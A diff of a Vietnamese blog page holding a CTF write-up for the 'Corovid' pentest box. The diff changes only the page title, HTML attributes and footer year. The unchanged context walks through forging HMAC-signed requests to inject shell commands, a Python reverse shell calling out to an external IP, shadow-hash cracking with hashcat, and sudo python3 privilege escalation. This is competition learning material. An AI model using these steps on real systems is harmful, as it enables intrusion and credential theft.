@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
   
-    <title>CTF ESAIP HACK CHALLENGE 4th edition - 29 Mai 2021 Final Writeup Box Pentest Corovid :: Kn — Anything that&#39;s software</title>
+    <title>CTF ESAIP HACK CHALLENGE 4th edition - 29 Mai 2021 Final Writeup Box Pentest Corovid :: Kn — Anything that&#39;s system and software</title>
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <meta name="description" content="ESAPI 20/5/2021 writeup"/>
-<meta name="keywords" content="blog, software, software-engineering, technology, code"/>
+<meta name="keywords" content="blog, software, software-engineering, technology, code, devops"/>
 <meta name="robots" content="noodp"/>
 <link rel="canonical" href="https://huyhoang8398.github.io/blog/posts/esaip-29052021/" />
 
@@ -28,7 +28,7 @@
 
 
 <meta name="twitter:card" content="summary" />
-<meta name="twitter:title" content="CTF ESAIP HACK CHALLENGE 4th edition - 29 Mai 2021 Final Writeup Box Pentest Corovid :: Kn — Anything that&#39;s software" />
+<meta name="twitter:title" content="CTF ESAIP HACK CHALLENGE 4th edition - 29 Mai 2021 Final Writeup Box Pentest Corovid :: Kn — Anything that&#39;s system and software" />
 <meta name="twitter:description" content="ESAPI 20/5/2021 writeup" />
 <meta name="twitter:site" content="https://huyhoang8398.github.io/blog" />
 <meta name="twitter:creator" content="" />
@@ -37,7 +37,7 @@
 
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="CTF ESAIP HACK CHALLENGE 4th edition - 29 Mai 2021 Final Writeup Box Pentest Corovid :: Kn — Anything that&#39;s software">
+<meta property="og:title" content="CTF ESAIP HACK CHALLENGE 4th edition - 29 Mai 2021 Final Writeup Box Pentest Corovid :: Kn — Anything that&#39;s system and software">
 <meta property="og:description" content="ESAPI 20/5/2021 writeup" />
 <meta property="og:url" content="https://huyhoang8398.github.io/blog/posts/esaip-29052021/" />
 <meta property="og:site_name" content="CTF ESAIP HACK CHALLENGE 4th edition - 29 Mai 2021 Final Writeup Box Pentest Corovid" />
@@ -179,7 +179,7 @@
 <p>Challage web được xây dựng bằng Python ở back-end qua command <code>nmap -sC -sV -A -p- &lt;ip&gt;</code>. Các request được gửi từ phía Front-End đến Back-End theo các khoảng thời gian đều đặn bằng lệnh shell để để lấy kết quả mới nhất về số ca Covid trên toàn thế giới. Các request cũng đã được ký ở phía Front-End.</p>
 <p><img src="nmap.png" alt="Nmap scan"></p>
 <p>Request Sample:</p>
-<pre><code>GET /get-last-results?
+<pre tabindex="0"><code>GET /get-last-results?
 shell=cat%20/tmp/.corovid_value.txt&amp;auth_ts=1620764393&amp;auth_sign=d643a98d4
 ce0b407beacdf750a55cff8b371d207bfbec0ae0667c1aa48b2f33a HTTP/1.1
 </code></pre><p><img src="scr1.png" alt="Client code">
@@ -187,9 +187,9 @@ ce0b407beacdf750a55cff8b371d207bfbec0ae0667c1aa48b2f33a HTTP/1.1
 <p>Đối với những bài có sourcecode sẵn như thế này, thì mình thường lướt sơ và hiểu toàn bộ cấu trúc của source trước khi làm. Sau khi xem toàn bộ source thì mình phát hiện một số điều đáng nghi.</p>
 <p>Code khá là lộn xộn nhưng có thể dễ dàng thấy được function y() dùng để tạo 1 request tới back-end với mẫu như ở trên. Hơn nữa, bằng cách đặt một breakpoint tại lúc tạo chữ kí với <code>HMAC256</code> thì chúng ta có thể thấy được request sẽ kèm 1 shell command tới sever để query số ca nhiễm covid ( ở đây là <code>cat /tmp/.corovid_value.txt</code>)</p>
 <p>Pattern khi kí sẽ gồm</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">HmacSHA256</span>(<span style="color:#e6db74">&#34;{timestamp 10 digits}:{commande unix}&#34;</span>, <span style="color:#e6db74">&#34;You are a hacker&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">HmacSHA256</span>(<span style="color:#e6db74">&#34;{timestamp 10 digits}:{commande unix}&#34;</span>, <span style="color:#e6db74">&#34;You are a hacker&#34;</span>)
 </code></pre></div><p>vậy nên dễ dàng có thể tái tạo lại một signature khác kèm theo câu lệnh mình mong muốn cùng với timestamp, dưới đây là một ví dụ:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">command <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;command : &#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">command <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;command : &#34;</span>)
 timestamp <span style="color:#f92672">=</span> str(int(datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>now()<span style="color:#f92672">.</span>timestamp()))
 sign <span style="color:#f92672">=</span> hmac<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;You are a hacker&#34;</span><span style="color:#f92672">.</span>encode(), (timestamp <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> command)<span style="color:#f92672">.</span>encode(), hashlib<span style="color:#f92672">.</span>sha256)<span style="color:#f92672">.</span>hexdigest()
 parameters <span style="color:#f92672">=</span> {
@@ -198,9 +198,9 @@ parameters <span style="color:#f92672">=</span> {
  <span style="color:#e6db74">&#34;auth_sign&#34;</span>:sign
 }
 rep <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url,params<span style="color:#f92672">=</span>parameters)
-<span style="color:#66d9ef">print</span>(rep<span style="color:#f92672">.</span>text)
+print(rep<span style="color:#f92672">.</span>text)
 </code></pre></div><p>Vì máy chủ web sử dụng python 3 (được phát hiện trong quá trình nhận dạng với nmap), có thể thông qua tập lệnh tạo request với chữ ký hợp lệ để thực hiện trình reverse shell với payload ( có thể đọc thêm về reverse shell payload ở <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">đây</a>)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os
 s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
 s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;51.38.123.73&#34;</span>,<span style="color:#ae81ff">4242</span>))
 os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
@@ -210,7 +210,7 @@ os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>
 pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
 </code></pre></div><p>Tada! Đã có thể login vào shell với user là <code>pfizer</code>.
 Mình có thử xem trong <code>/home/pfizer</code> có 1 file <code>flag.txt</code> nhưng đây không phải thứ cần tìm ( đời đâu dễ như thế :( )</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -la /root
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -la /root
 </code></pre></div><p>thì có thể thấy <code>/root/flag.txt</code> ( mình đoán đây mới là thứ cần tìm ).</p>
 <p>Bằng cách hiển thị nội dung của /etc/passwd, chúng ta thấy rằng có 3 người dùng có shell:</p>
 <ul>
@@ -222,25 +222,25 @@ Mình có thử xem trong <code>/home/pfizer</code> có 1 file <code>flag.txt</c
 <p><img src="psaux.png" alt="ps aux with user pfizer"></p>
 <p>Một điều lạ là chúng ta chỉ có thể thấy các process của người dùng hiện tại là pfizer.
 Mình thử liệt kê tất cả các file thuộc quyền sở hữu ứng với các <code>user</code> bằng command</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -laR / 2&gt;/dev/null | grep $USER
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -laR / 2&gt;/dev/null | grep $USER
 </code></pre></div><p>Chúng tôi thấy rằng một tệp ẩn có tên <code>.bckp_2021-XX-XX_XX:XX.zip</code> trong thư mục /srv trong đó chủ sở hữu là <code>root</code> có thể đọc được bởi group <code>pfizer</code>.</p>
 <p><img src="ls.png" alt="list file by owner"></p>
 <p>Unzip nó ra thì có thể thấy một bản backup chứa tất cả các hash của system password.</p>
 <p><img src="image-015.png" alt="unzip">
 <img src="image-016.png" alt="unzip"></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">grep -rn ENCRYPT_METHOD /etc/login.defs
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">grep -rn ENCRYPT_METHOD /etc/login.defs
 
 265:# This variable is deprecated. You should use ENCRYPT_METHOD.
 279:ENCRYPT_METHOD SHA512
 282:# Only used <span style="color:#66d9ef">if</span> ENCRYPT_METHOD is set to SHA256 or SHA512.
 </code></pre></div><p>User pfizer chỉ dùng để run web service nên mình cần quan tâm tới user <code>root</code> và <code>astrazeneca</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tail shadow | grep <span style="color:#e6db74">&#34;astrazeneca&#34;</span> | awk -F<span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tail shadow | grep <span style="color:#e6db74">&#34;astrazeneca&#34;</span> | awk -F<span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span>
 </code></pre></div><p><img src="image-018.png" alt="hash password user astrazeneca"></p>
 <p>Crack hash password thì mình dùng <code>hashcat</code> với wordlist là <a href="https://github.com/brannondorsey/naive-hashcat/">rockyou</a></p>
 <p>Tada! Password là <code>monsauveur</code></p>
 <p>Lúc này thì khá đơn giản rồi, chỉ cần check quyền sudo execution của user với <code>sudo -l</code> và có thể thấy là user <code>astrazeneca</code> có thể chạy python3 mà không cần password :v</p>
 <p><strong>Exploitation</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /usr/bin/python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /usr/bin/python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
 </code></pre></div><p><img src="image-023.png" alt="Flag"></p>
 <p>Mình có làm thêm được 2 bài Stegano nữa nhưng mà dễ quá nên không write up :v</p>
 
@@ -284,7 +284,7 @@ Mình thử liệt kê tất cả các file thuộc quyền sở hữu ứng v�
   <div class="footer__inner">
     
       <div class="copyright">
-        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
     
         <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
       </div>
